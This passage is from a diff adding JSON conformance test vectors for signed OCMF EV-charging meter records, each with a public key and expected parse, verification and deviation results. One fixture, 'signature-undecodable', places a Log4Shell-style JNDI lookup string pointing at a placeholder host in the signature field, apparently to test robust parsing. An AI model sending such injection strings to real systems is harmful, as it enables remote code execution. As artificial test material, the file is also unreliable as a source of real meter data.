+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000123+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"304402200B05AB4E443D00659F4BCCE09EB7423F428A39E4A192D37555D1BA0A76EBE91202203DDAEFFE0B35DE8D5FBCEA24BAAFBFDBEA9E2EA4AD66825E0298B7F59331E2DD\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": ["TimeSubSecondDigits"], "readings": 1, "billable_readings": 1 }
+  },
+  {
+   "id": "deviation/obis-malformed",
+   "group": "deviation",
+   "description": "RI with no OBIS shape at all [OCMF Tab. 25]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"not-an-obis-code\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"30440220274876D5446304D41ED76AD2C5391FA8EA4476B872C53CAF5C5024ABB3B5364402200E60F5B866E68EC1BE6C95CC140D42B198EBE8B18C1FF9C5E65E085735AFAB68\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": ["ObisMalformed"], "readings": 1, "billable_readings": 1 }
+  },
+  {
+   "id": "deviation/number-unrepresentable",
+   "group": "deviation",
+   "description": "RV beyond what a 96-bit decimal holds: money is never rounded, so the value is dropped",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":123456789012345678901234567890123,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3044022068E45AE94969ECC03B7B0636E4AE2D1D8946623F02FB439E6DD3040B6BF209CF02207648D38743FF06C68D7D0C15F1ECA396FB56F4DF9880F06C04017AE8ADEE1A66\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": ["NumberUnrepresentable"], "readings": 1, "billable_readings": 0 }
+  },
+  {
+   "id": "deviation/invalid-string-escape",
+   "group": "deviation",
+   "description": "a backslash escape RFC 8259 does not define, which parsers resolve differently",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"AC\\qME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3044022064E8E0D459A8CCB6B92BFD32B2A019A329BE194E48B3B01842DE87BC3299B06B022044DCA45A15D917947FF4B56AAAA1561711C33949297AB4400E23AECB26F169C6\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": ["InvalidStringEscape"], "readings": 1, "billable_readings": 1 }
+  },
+  {
+   "id": "deviation/pretty-printed-payload",
+   "group": "deviation",
+   "description": "a payload with whitespace outside strings — lawful, and fatal to re-serialisation",
+   "record": "OCMF|{\n  \"FV\": \"1.3\",\n  \"PG\": \"T1\",\n  \"MS\": \"1CONF00000001\",\n  \"IS\": true,\n  \"IF\": [],\n  \"IT\": \"NONE\",\n  \"RD\": [{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]\n}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3044022064D6CF6D9C9E36D87C977D237C188DA5F7B381EDAD87F743FC16E23AAD2D53AE02206F05D96FDF58E9B55E70A18D60D42EB056CAF1D8C5025A14DD331798ED932679\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": ["PrettyPrintedPayload"], "readings": 1, "billable_readings": 1 }
+  },
+  {
+   "id": "deviation/raw-rs-signature",
+   "group": "deviation",
+   "description": "SD as a bare 64-byte r||s where SM says DER, as Isabellenhütte writes it",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"583028797B6A7B2C18938F9E46A2D3533961CDD26869695D1CEE34E71120A4587BCA8581C58B7132A4445E2F11844DBD5C826522628F0641D8DCADFDE91A0534\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": ["RawSignatureNotDer"], "readings": 1, "billable_readings": 1 }
+  },
+  {
+   "id": "deviation/non-canonical-der",
+   "group": "deviation",
+   "description": "SD in DER with a non-minimal length, which BouncyCastle accepts",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3081440220583028797B6A7B2C18938F9E46A2D3533961CDD26869695D1CEE34E71120A45802207BCA8581C58B7132A4445E2F11844DBD5C826522628F0641D8DCADFDE91A0534\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": ["NonCanonicalDer"], "readings": 1, "billable_readings": 1 }
+  },
+  {
+   "id": "deviation/algorithm-spelling",
+   "group": "deviation",
+   "description": "SA spelled brainpoolP256r1 where Tab. 22 writes brainpool256r1",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-brainpoolP256r1-SHA256\",\"SD\":\"30440220583028797B6A7B2C18938F9E46A2D3533961CDD26869695D1CEE34E71120A45802207BCA8581C58B7132A4445E2F11844DBD5C826522628F0641D8DCADFDE91A0534\"}",
+   "expect": { "parses": true, "round_trips": true, "verifies": null, "deviations": ["AlgorithmIdentifierSpelling"], "readings": 1, "billable_readings": 1 }
+  },
+  {
+   "id": "deviation/base64-signature",
+   "group": "deviation",
+   "description": "SE = base64, which one record in the whole reference corpus uses",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SE\":\"base64\",\"SD\":\"MEQCIFgwKHl7anssGJOPnkai01M5Yc3SaGlpXRzuNOcRIKRYAiB7yoWBxYtxMqREXi8RhE29XIJlImKPBkHY3K396RoFNA==\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 1, "billable_readings": 1 }
+  },
+  {
+   "id": "deviation/signature-undecodable",
+   "group": "deviation",
+   "description": "SD that is not valid hex: the payload is intact and must survive",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SD\":\"${jndi:ldap://example.invalid/a}\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": false, "deviations": ["SignatureDataUndecodable"], "readings": 1, "billable_readings": 1 }
+  },
+  {
+   "id": "deviation/signature-data-missing",
+   "group": "deviation",
+   "description": "a signature section with no SD: nothing to check, and a payload worth keeping",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": false, "deviations": ["SignatureDataMissing"], "readings": 1, "billable_readings": 1 }
+  },
+  {
+   "id": "deviation/algorithm-undefined",
+   "group": "deviation",
+   "description": "SA naming an algorithm outside Tab. 22: refused by name, never checked as another",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"RSA-2048-SHA256\",\"SD\":\"30440220583028797B6A7B2C18938F9E46A2D3533961CDD26869695D1CEE34E71120A45802207BCA8581C58B7132A4445E2F11844DBD5C826522628F0641D8DCADFDE91A0534\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": false, "deviations": ["UndefinedTableValue"], "readings": 1, "billable_readings": 1 }
+  },
+  {
+   "id": "deviation/fourth-section-public-key",
+   "group": "deviation",
+   "description": "the withdrawn fourth section carrying a public key (S.A.F.E. issue #16)",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"30440220583028797B6A7B2C18938F9E46A2D3533961CDD26869695D1CEE34E71120A45802207BCA8581C58B7132A4445E2F11844DBD5C826522628F0641D8DCADFDE91A0534\"}|3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": ["FourthSectionPublicKey"], "readings": 1, "billable_readings": 1 }
+  },
+  {
+   "id": "deviation/high-s-signature",
+   "group": "deviation",
+   "description": "a real record whose signature `s` is above n/2 — the malleable twin verifies too",
+   "record": "OCMF|{\"FV\":\"1.0\",\"GI\":\"KEBA_KCP30\",\"GS\":\"17619300\",\"GV\":\"2.8.5\",\"PG\":\"T32\",\"IS\":false,\"IL\":\"NONE\",\"IF\":[\"RFID_NONE\",\"OCPP_NONE\",\"ISO15118_NONE\",\"PLMN_NONE\"],\"IT\":\"NONE\",\"ID\":\"\",\"RD\":[{\"TM\":\"2019-08-13T10:03:15,000+0000 I\",\"TX\":\"B\",\"EF\":\"\",\"ST\":\"G\",\"RV\":0.2596,\"RI\":\"1-b:1.8.0\",\"RU\":\"kWh\"},{\"TM\":\"2019-08-13T10:03:36,000+0000 R\",\"TX\":\"E\",\"EF\":\"\",\"ST\":\"G\",\"RV\":0.2597,\"RI\":\"1-b:1.8.0\",\"RU\":\"kWh\"}]}|{\"SD\":\"304502200E2F107C987A300AC1695CA89EA149A8CDFA16188AF0A33EE64B67964AA943F9022100889A72B6D65364BEA8562E7F6A0253157ACFF84FE4929A93B5964D23C4265699\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200043AEEB45C392357820A58FDFB0857BD77ADA31585C61C430531DFA53B440AFBFDD95AC887C658EA55260F808F55CA948DF235C2108A0D6DC7D4AB1A5E1A7955BE",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": ["MeterSerialMissing", "ObisNonCanonical", "ObisNonCanonical", "HighSSignature"], "readings": 2, "billable_readings": 2 }
+  },
+  {
+   "id": "deviation/pipe-in-tariff-text",
+   "group": "deviation",
+   "description": "a pipe inside TT: unlawful, lawful-looking, and fatal to every split-based parser",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"TT\":\"Nacht|Tarif\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3045022100CC1BBC0F822B311C772A23C6B0D01F0A6878052AF73005542B610774BF2F70AB022006781C60253BF6987B1C7B24A380F8613F70BD4E1233B63745669003CAAFC3F1\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 1, "billable_readings": 1 }
+  },
+  {
+   "id": "curve/secp192k1",
+   "group": "curve",
+   "description": "a record signed ECDSA-secp192k1-SHA256 [OCMF Tab. 22]",
+   "record": "OCMF|{\"FV\":\"1.4\",\"GI\":\"ocmf-rs vector generator\",\"GS\":\"VEC-01\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1VEC0000000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\",\"OCPP_AUTH_TLS\",\"ISO15118_NONE\",\"PLMN_NONE\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"TT\":\"Vector tariff\",\"LC\":{\"LN\":\"cable\",\"LI\":1,\"LR\":2,\"LU\":\"mOhm\"},\"CT\":\"EVSEID\",\"CI\":\"DE*ABC*E001\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"CL\":0.5,\"EF\":\"\",\"ST\":\"G\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"CL\":0.5,\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp192k1-SHA256\",\"SD\":\"3036021900EBEDDA68C004BCDC22AF12BB6598E5B1C445286C2200D7A3021900AF144552D444A8AFDE37AE7295CBD5BED0A89E413FAB14EC\"}",
+   "key": "3046301006072A8648CE3D020106052B8104001F033200044181F41532330EB91E3FF3E712AAA7C431BC58A932F5A93B5392B2D1F3A57964B79579C29929054F692D8DE627B8EB6D",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": ["FormatVersionAheadOfReference", "HighSSignature"], "readings": 2, "billable_readings": 2 }
+  },
+  {
+   "id": "curve/secp256k1",
+   "group": "curve",
+   "description": "a record signed ECDSA-secp256k1-SHA256 [OCMF Tab. 22]",
+   "record": "OCMF|{\"FV\":\"1.4\",\"GI\":\"ocmf-rs vector generator\",\"GS\":\"VEC-02\",\"GV\":\"0.1.0\",\"PG\":\"T2\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1VEC0000000002\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\",\"OCPP_AUTH_TLS\",\"ISO15118_NONE\",\"PLMN_NONE\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"TT\":\"Vector tariff\",\"LC\":{\"LN\":\"cable\",\"LI\":1,\"LR\":2,\"LU\":\"mOhm\"},\"CT\":\"EVSEID\",\"CI\":\"DE*ABC*E002\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"CL\":0.5,\"EF\":\"\",\"ST\":\"G\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"CL\":0.5,\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256k1-SHA256\",\"SD\":\"30440220017E9FC07A7D680E85F938023245742E0ECBB29EE47279AE1A1B5F59C48F0C8C0220273DD9B4136FDE5C73F5BC4C9E257CBF2135876DBC6C7AE1B5780F2D9D530F4B\"}",
+   "key": "3056301006072A8648CE3D020106052B8104000A034200040B1E50BD226E021776C9D6EEAC2C28A44BDEE21E08050F4A1FAAEB5A644D45F072D3EE463610B90851AFCA0939D40C75DD5E3AE3CF3A70F239C0CA3DB622E286",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": ["FormatVersionAheadOfReference"], "readings": 2, "billable_readings": 2 }
+  },
+  {
+   "id": "curve/secp192r1",
+   "group": "curve",
+   "description": "a record signed ECDSA-secp192r1-SHA256 [OCMF Tab. 22]",
+   "record": "OCMF|{\"FV\":\"1.4\",\"GI\":\"ocmf-rs vector generator\",\"GS\":\"VEC-03\",\"GV\":\"0.1.0\",\"PG\":\"T3\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1VEC0000000003\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\",\"OCPP_AUTH_TLS\",\"ISO15118_NONE\",\"PLMN_NONE\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"TT\":\"Vector tariff\",\"LC\":{\"LN\":\"cable\",\"LI\":1,\"LR\":2,\"LU\":\"mOhm\"},\"CT\":\"EVSEID\",\"CI\":\"DE*ABC*E003\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"CL\":0.5,\"EF\":\"\",\"ST\":\"G\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"CL\":0.5,\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp192r1-SHA256\",\"SD\":\"30350218503FF658382AF81681FD4A3493CED93BFB1545457027A48C0219009C9AC9493FFD0A93D3541394AB89EB5B1B8241B4CA9D05BD\"}",
+   "key": "3049301306072A8648CE3D020106082A8648CE3D03010103320004D18C7ED4B63ACB6F51DD103AF5CCF946BF31130B1BA19BC3D35A8DA1DDEFB458067F021C725AA51877E71111A503BAFD",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": ["FormatVersionAheadOfReference", "HighSSignature"], "readings": 2, "billable_readings": 2 }
+  },
+  {
+   "id": "curve/secp256r1",
+   "group": "curve",
+   "description": "a record signed ECDSA-secp256r1-SHA256 [OCMF Tab. 22]",
+   "record": "OCMF|{\"FV\":\"1.4\",\"GI\":\"ocmf-rs vector generator\",\"GS\":\"VEC-04\",\"GV\":\"0.1.0\",\"PG\":\"T4\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1VEC0000000004\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\",\"OCPP_AUTH_TLS\",\"ISO15118_NONE\",\"PLMN_NONE\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"TT\":\"Vector tariff\",\"LC\":{\"LN\":\"cable\",\"LI\":1,\"LR\":2,\"LU\":\"mOhm\"},\"CT\":\"EVSEID\",\"CI\":\"DE*ABC*E004\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"CL\":0.5,\"EF\":\"\",\"ST\":\"G\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"CL\":0.5,\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"304502201165AC02C5BCB96DA86641CEE4858AC58A0638055B13DA7B83CA7536F24FAD620221009110A6FBF409F8764512278D032EB866FA3A343E581B74450322928FD1DD0260\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D03010703420004C803EBE536BFFAE4154F14AC3C87F0E52E2B9E3F07CCE91D8EF031525FB934249CE71468E4DA7AE64622A1B308D7297DF2C8AD68D31898B2C6A1A371C85E9219",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": ["FormatVersionAheadOfReference", "HighSSignature"], "readings": 2, "billable_readings": 2 }
+  },
+  {
+   "id": "curve/brainpoolP256r1",
+   "group": "curve",
+   "description": "a record signed ECDSA-brainpool256r1-SHA256 [OCMF Tab. 22]",
